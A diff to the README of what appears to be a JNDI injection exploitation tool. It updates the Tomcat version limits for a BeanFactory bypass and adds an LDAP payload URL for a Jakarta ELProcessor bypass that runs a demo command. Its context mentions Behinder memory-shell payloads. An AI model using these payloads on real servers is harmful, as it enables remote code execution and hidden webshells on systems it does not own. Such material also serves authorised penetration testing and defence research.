@@ -125,7 +125,7 @@ ldap://127.0.0.1:1389/Basic/MemShell/SpringWebMvc/Behinder/ControllerHandler
 
 ## BeanFactory Bypass
 
-Bypass restrictions on higher JDK versions using BeanFactory. The Tomcat version must be earlier than 8.5.79 or 9.0.63
+Bypass restrictions on higher JDK versions using BeanFactory. The Tomcat version must be earlier than 8.5.79, 9.0.63, 10.0.21 or 10.1.0-M14
 
 Supported bypass methods:
 
@@ -142,11 +142,14 @@ Supported bypass methods:
 
 ### Tomcat ELProcessor
 
-Use `javax.el.ELProcessor` to execute EL expressions
+Use `javax.el.ELProcessor` (Tomcat 8-9) or `jakarta.el.ELProcessor` (Tomcat 10) to execute EL expressions
 
 ```bash
-# Tomcat Bypass
+# Tomcat Bypass (8-9)
 ldap://127.0.0.1:1389/TomcatBypass/Command/open -a Calculator
+
+# Tomcat Jakarta Bypass (10)
+ldap://127.0.0.1:1389/TomcatJakartaBypass/Command/open -a Calculator
 ```
 
 ### Groovy ClassLoader/Shell
